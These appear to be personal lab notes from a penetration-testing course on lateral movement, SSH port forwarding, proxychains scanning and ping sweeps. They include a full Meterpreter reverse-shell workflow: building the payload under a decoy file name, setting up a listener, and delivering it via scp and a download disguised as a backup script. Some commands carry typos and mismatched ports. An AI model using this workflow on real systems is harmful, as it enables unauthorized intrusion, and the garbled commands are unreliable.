# Pivoting, Tunneling and Port-Forwarding
## Lateral Movement

It can be described as a technique used to further our access to additional `hosts,
applications and services` within a network environment. 

The same can be said about `Latteral Privilege Escalation` where we move to 'other users' 
on the local machine. Lateral movement often enables privilege sescalation across hosts. 

In addition to this, we can also study how other respected organizations explain Lateral
Movement. Check out https://www.paloaltonetworks.com/cyberpedia/what-is-lateral-movement 
and https://attack.mitre.org/tactics/TA0008/.

## Pivoting
## Scanning the Pivot Target

```bash
nmap -sT -p22,3306 10.129.202.64

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
Nmap scan report for 10.129.202.64
Host is up (0.12s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds

ssh -L 1337:localhost:3306 Ubuntu@10.129.202.64
netstat -antp | grep 1337

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)

...SNIP...

bluechat@htb[/htb]$ nmap -v -sV -p1234 localhost

PORT     STATE SERVICE VERSION
1337/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3

```

We can forward multiple ports from Ubuntu to the localhost using `local-port:server:port`

```bash
bluechat@htb[/htb]$ ssh -L 1337:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```

## Setting Up to Pivot

If we type `ifconfig` on the Ubuntu host, you will find the server already has multiple NICs:

	- One connected to our attack host (10.129.202.64)
	- One communicating to other hosts on a different network (172.16.5.129)
	- The loopback interface (lo)

```bash
ubuntu@WEB01:~$ ifconfig 

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)
        RX packets 35571  bytes 177919049 (177.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10452  bytes 1474767 (1.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)
        RX packets 8251  bytes 1125190 (1.1 MB)
        RX errors 0  dropped 40  overruns 0  frame 0
        TX packets 1538  bytes 123584 (123.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 270  bytes 22432 (22.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 270  bytes 22432 (22.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```


```bash
ssh -D 9050 ubuntu@10.129.202.64
proxychains nmap -v -sn 172.16.5.1-200
proxychains nmap -v -Pn -sT 172.16.5.196(?)
```

## Remote/Reverse Port Forwarding with SSH

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<Internal pivboi> 
-f exe -o definitelynotareverseshellpleasemoveonthankyou.exe LPORT=8080
```

Now configure multi/handler:

```bash
use exploit/multi/handler
set payload window/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

Once our payload is created and we have our listener configured, we can copy the payload to the Ubuntu server using the scp command since we have the credentials.

```bash
scp definitelynotareverseshellpleasemoveonthankyou.exe ubuntu@<Victim IP>:~/
```

After copying the payload, we will start a python3 HTTP server on Ubuntu and download it from Host #3 (A Windows Workstation).

```bash
python3 -m http.server 8123

PS:
Invoke-WebRequest -Uri "
http://172.16.5.129:8123/definitelynotareverseshellpleasemoveonthankyou.exe" 
-Outfile "C:\backupscript.exe"
```
```bash
[HOME] ssh -R <Internal pivotboi>:8080:0.0.0.0:8000 ubuntu@<Victim IP> -vN

ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```

Our meterpreter session should list that our incoming connection 
is actually from localhost (127.0.0.1) since we are recieving the connection 
over the local SSH socket, which created an outbound connection to Ubuntu. 

Issuing the netstat command can show us that the incoming connection is coming from SSH. 
https://academy.hackthebox.com/storage/modules/158/44.png


## Ping Sweep

Windows:
```
1..254 | % {"172.16.1.$($_): $(Test-Connection -count 1 -comp 172.16.1.$($_) -quiet)"}
```

Linux:
```
for i in {1..254}; do (pint -c 1 172.16.1.$i | grep "bytes from" &); done
```

Windows CMD:
```
for /L %i in (1 1 254) do point 172.16.1.%i -n 1 -w 100 | find "Reply"
```